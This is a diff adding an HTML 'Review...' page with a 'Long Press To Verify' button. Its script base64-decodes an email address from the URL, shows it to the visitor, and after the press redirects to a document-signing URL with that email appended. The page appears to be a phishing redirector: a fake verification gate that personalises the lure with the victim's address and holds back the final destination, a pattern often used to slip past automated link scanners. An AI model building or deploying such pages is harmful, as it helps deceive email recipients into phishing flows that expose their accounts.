@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Review...</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white; /* Background color of the whole page */
+        }
+        .container {
+            text-align: center; /* Center the text in the container */
+        }
+        .dots-container {
+            display: none; /* Initially hide the loading dots */
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: darkblue; /* Color of the loading dots */
+            border-radius: 50%; /* Make the dots round */
+            width: 10px; /* Width of the dots */
+            height: 10px; /* Height of the dots */
+            margin: 5px; /* Space between dots */
+            animation: grow 1.5s infinite ease-in-out; /* Animation for the dots */
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); } /* Scale dots to original size at the start and end of animation */
+            50% { transform: scale(1.5); } /* Scale dots to 1.5 times their size at the middle of animation */
+        }
+        #emailDisplay {
+            color: dodgerblue; /* Text color for the email display */
+            font-size: 18px; /* Font size for the email display */
+            margin-bottom: 20px; /* Margin below the email display */
+        }
+        #longPressButton {
+            padding: 10px 20px; /* Padding inside the button */
+            font-size: 16px; /* Font size for the button text */
+            cursor: pointer; /* Change cursor to pointer on hover */
+            margin-bottom: 20px; /* Margin below the button */
+            background-color: mediumslateblue; /* Background color for the button */
+            color: white; /* White text color for the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            user-select: none; /* Prevent copying text on long press */
+        }
+        #longPressButton:hover {
+            background-color: blue; /* Hover background color */
+        }
+        .progress-container {
+            width: 100%; /* Full width progress bar */
+            background-color: lightgrey; /* Background color for the progress container */
+            height: 20px; /* Height of the progress container */
+            border-radius: 5px; /* Rounded corners for the progress container */
+            overflow: hidden; /* Hide overflow content */
+            margin-bottom: 20px; /* Margin below the progress container */
+        }
+        .progress-bar {
+            height: 100%; /* Full height progress bar */
+            background-color: darkblue; /* Background color for the progress bar */
+            width: 0; /* Initial width of the progress bar */
+            transition: width 0.1s; /* Smooth transition for the width change */
+        }
+    </style>
+        <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CFJ2PKQ3C8"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-CFJ2PKQ3C8');
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="data:image/png;base64,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" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div> <!-- Element to display the email -->
+        <div class="progress-container">
+            <div id="progressBar" class="progress-bar"></div> <!-- Progress bar inside the container -->
+        </div>
+        <button id="longPressButton">Long Press To Verify </button> <!-- Long press button -->
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div> <!-- Loading dots -->
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a> <!-- Hidden redirect link -->
+    <script>
+        // Function to decode base64 string
+        function decodeBase64(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            } catch (e) {
+                console.error("Decoding failed: ", e);
+                return null; // Return null if decoding fails
+            }
+        }
+
+        // Function to find and decode the email parameter
+        function findEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams.entries()) {
+                const decodedValue = decodeBase64(key);
+                if (decodedValue && decodedValue.includes('@')) {
+                    return decodedValue; // Return the decoded email
+                }
+            }
+            return null;
+        }
+
+        // Function to handle redirection
+        function redirectToTarget(email) {
+            const links = [
+              
+                `https://docusign.com/${encodeURIComponent(email)}`
+            ];
+            const randomLink = links[Math.floor(Math.random() * links.length)];
+            console.log("Redirecting to: ", randomLink);
+            window.location.href = randomLink;
+        }
+
+        // Function to update the displayed email
+        function updateLink() {
+            const email = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (email) {
+                console.log("Displaying email: ", email);
+                emailDisplay.innerText = email; // Always display the email
+            } else {
+                console.error("No email to display");
+            }
+        }
+
+        // Long press button functionality
+        const button = document.getElementById('longPressButton');
+        const progressBar = document.getElementById('progressBar');
+
+        let timer;
+        let progress = 0;
+        const holdTime = 1200; // time in milliseconds to hold the button
+
+        const startProgress = () => {
+            progress = 0;
+            progressBar.style.width = '0%';
+            timer = setInterval(() => {
+                progress += 100 / (holdTime / 100);
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    // Hide the long press button and progress bar
+                    button.style.display = 'none';
+                    document.querySelector('.progress-container').style.display = 'none';
+                    // Show loading dots
+                    document.querySelector('.dots-container').style.display = 'flex';
+                    // Wait for 2 seconds before redirecting
+                    setTimeout(() => {
+                        const email = findEmailParam();
+                        if (email) {
+                            redirectToTarget(email);
+                        } else {
+                            console.error("No email found for redirection");
+                        }
+                    }, 2000);
+                }
+            }, 100);
+        };
+
+        const stopProgress = () => {
+            clearInterval(timer);
+            progressBar.style.width = '0%';
+        };
+
+        button.addEventListener('mousedown', startProgress);
+        button.addEventListener('touchstart', (e) => {
+            e.preventDefault(); // Prevent default touch behavior
+            startProgress();
+        });
+        button.addEventListener('mouseup', stopProgress);
+        button.addEventListener('mouseleave', stopProgress);
+        button.addEventListener('touchend', stopProgress);
+        button.addEventListener('touchcancel', stopProgress);
+
+        window.onload = updateLink;
+    </script>
+</body>
+</html>
